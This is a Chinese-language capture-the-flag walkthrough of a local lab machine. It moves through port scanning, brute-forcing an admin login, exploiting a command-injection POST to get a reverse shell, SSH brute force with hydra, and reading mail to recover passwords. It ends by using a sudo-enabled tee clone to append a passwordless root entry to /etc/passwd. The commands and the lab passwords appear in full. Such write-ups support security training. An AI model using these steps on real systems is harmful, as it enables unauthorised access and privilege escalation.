# 信息收集

### 1.主机探测

192.168.1.111

![1667618352_6365d6301338dabb4667e.png!small?1667618352033](https://image.3001.net/images/20221105/1667618352_6365d6301338dabb4667e.png!small?1667618352033)

### 2.端口扫描 22、80

    
    
    nmap -T4 -A -p- -v 192.168.1.111 

![1667618362_6365d63a203ceb5bd1add.png!small?1667618362144](https://image.3001.net/images/20221105/1667618362_6365d63a203ceb5bd1add.png!small?1667618362144)

### 3.CMS

![1667618370_6365d642df23f62f42280.png!small?1667618370931](https://image.3001.net/images/20221105/1667618370_6365d642df23f62f42280.png!small?1667618370931)

### 4.目录扫描

没扫出有用目录

# 渗透

### 1.访问192.168.1.111，提示用户名admin

![1667618381_6365d64dd0553515d2ecf.png!small?1667618381763](https://image.3001.net/images/20221105/1667618381_6365d64dd0553515d2ecf.png!small?1667618381763)

### 2.bp爆破

![1667618404_6365d6643ae26e103c43d.png!small?1667618404272](https://image.3001.net/images/20221105/1667618404_6365d6643ae26e103c43d.png!small?1667618404272)

登录：

![1667618413_6365d66d2bb9318db8a43.png!small?1667618413124](https://image.3001.net/images/20221105/1667618413_6365d66d2bb9318db8a43.png!small?1667618413124)

抓包：发现pos提交了一个linux命令，并执行了该命令。

![1667618423_6365d677688e62c744c0a.png!small?1667618423371](https://image.3001.net/images/20221105/1667618423_6365d677688e62c744c0a.png!small?1667618423371)

### 3.反弹shell

![1667618433_6365d681dd3eff669bc5f.png!small?1667618435356](https://image.3001.net/images/20221105/1667618433_6365d681dd3eff669bc5f.png!small?1667618435356)

### 4.home目录下发现两个用户名

    
    
    charles  
    jim  
    sam

### 5.在jim用户下发下一个密码文件，尝试ssh爆破登录三个用户。

    
    
    hydra -L username.txt -P password.txt ssh://192.168.1.111   
    ​  
    login: jim   password: jibril04

![1667618455_6365d697609d7b6daa930.png!small?1667618455413](https://image.3001.net/images/20221105/1667618455_6365d697609d7b6daa930.png!small?1667618455413)

### 6.ssh登录jim

发现一封邮件

![1667618465_6365d6a13a4532372ac1b.png!small?1667618465759](https://image.3001.net/images/20221105/1667618465_6365d6a13a4532372ac1b.png!small?1667618465759)

切换到/var/mail目录下查看用户邮件，发现charles的密码^xHhA&hvim0y

![1667618475_6365d6ab5e8470ce49ff0.png!small?1667618475357](https://image.3001.net/images/20221105/1667618475_6365d6ab5e8470ce49ff0.png!small?1667618475357)

### 7.ssh登录charles

![1667618483_6365d6b3300a5d60b9fd4.png!small?1667618483195](https://image.3001.net/images/20221105/1667618483_6365d6b3300a5d60b9fd4.png!small?1667618483195)

# 提权

### 1.查看可用的root命令

    
    
    find / -perm -u=s -type f 2>/dev/null

![1667618491_6365d6bbbba132a2a750a.png!small?1667618491948](https://image.3001.net/images/20221105/1667618491_6365d6bbbba132a2a750a.png!small?1667618491948)

### 2.查看sudo -l

发现(root) NOPASSWD: /usr/bin/teehee有root权限。

![1667618502_6365d6c61cded44af1a72.png!small?1667618502048](https://image.3001.net/images/20221105/1667618502_6365d6c61cded44af1a72.png!small?1667618502048)

发现一个/home/jim/test.sh脚本

![1667618513_6365d6d17abe413098b03.png!small?1667618513528](https://image.3001.net/images/20221105/1667618513_6365d6d17abe413098b03.png!small?1667618513528)

查看权限：可写

![1667618521_6365d6d9d4275094676a6.png!small?1667618521852](https://image.3001.net/images/20221105/1667618521_6365d6d9d4275094676a6.png!small?1667618521852)

尝试写入/bin/bash 执行后没提权。

### 3.尝试teehee提权

    
    
    echo "ii::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

![1667618539_6365d6ebcd16df5c89dd6.png!small?1667618539867](https://image.3001.net/images/20221105/1667618539_6365d6ebcd16df5c89dd6.png!small?1667618539867)

